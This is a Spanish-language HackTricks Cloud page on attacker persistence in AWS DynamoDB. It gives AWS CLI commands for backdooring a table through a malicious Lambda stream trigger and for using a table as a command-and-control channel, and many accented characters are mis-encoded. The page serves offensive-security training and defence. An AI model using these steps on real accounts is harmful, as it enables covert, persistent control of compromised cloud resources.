# AWS - Persistencia de DynamoDB

<details>

<summary><strong>隆Apoya a HackTricks y obt茅n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **煤ltima versi贸n de PEASS o descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PR a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### DynamoDB

Para obtener m谩s informaci贸n, acceda a:

{% content-ref url="../aws-services/aws-databases/aws-dynamodb-enum.md" %}
[aws-dynamodb-enum.md](../aws-services/aws-databases/aws-dynamodb-enum.md)
{% endcontent-ref %}

### Disparadores de DynamoDB con Backdoor de Lambda

Usando los disparadores de DynamoDB, un atacante puede crear una **puerta trasera sigilosa** asociando una funci贸n Lambda maliciosa con una tabla. La funci贸n Lambda puede ser activada cuando se agrega, modifica o elimina un elemento, permitiendo al atacante ejecutar c贸digo arbitrario dentro de la cuenta de AWS.

{% code overflow="wrap" %}
```bash
# Crear una funci贸n Lambda maliciosa
aws lambda create-function \
    --function-name MaliciousFunction \
    --runtime nodejs14.x \
    --role <LAMBDA_ROLE_ARN> \
    --handler index.handler \
    --zip-file fileb://malicious_function.zip \
    --region <region>

# Asociar la funci贸n Lambda con la tabla DynamoDB como disparador
aws dynamodbstreams describe-stream \
    --table-name TargetTable \
    --region <region>

# Tomar nota del "StreamArn" de la salida
aws lambda create-event-source-mapping \
    --function-name MaliciousFunction \
    --event-source <STREAM_ARN> \
    --region <region>
```
{% endcode %}

Para mantener la persistencia, el atacante puede crear o modificar elementos en la tabla DynamoDB, lo que activar谩 la funci贸n Lambda maliciosa. Esto permite al atacante ejecutar c贸digo dentro de la cuenta de AWS sin interacci贸n directa con la funci贸n Lambda.

### DynamoDB como canal C2

Un atacante puede usar una tabla DynamoDB como un **canal de comando y control (C2)** creando elementos que contengan comandos y usando instancias comprometidas o funciones Lambda para obtener y ejecutar estos comandos.

```bash
# Crear una tabla DynamoDB para C2
aws dynamodb create-table \
    --table-name C2Table \
    --attribute-definitions AttributeName=CommandId,AttributeType=S \
    --key-schema AttributeName=CommandId,KeyType=HASH \
    --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
    --region <region>

# Insertar un comando en la tabla
aws dynamodb put-item \
    --table-name C2Table \
    --item '{"CommandId": {"S": "cmd1"}, "Command": {"S": "malicious_command"}}' \
    --region <region>
```

Las instancias comprometidas o las funciones Lambda pueden verificar peri贸dicamente la tabla C2 en busca de nuevos comandos, ejecutarlos y opcionalmente informar los resultados a la tabla. Esto permite al atacante mantener la persistencia y el control sobre los recursos comprometidos. 

<details>

<summary><strong>隆Apoya a HackTricks y obt茅n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **煤ltima versi贸n de PEASS o descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PR a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>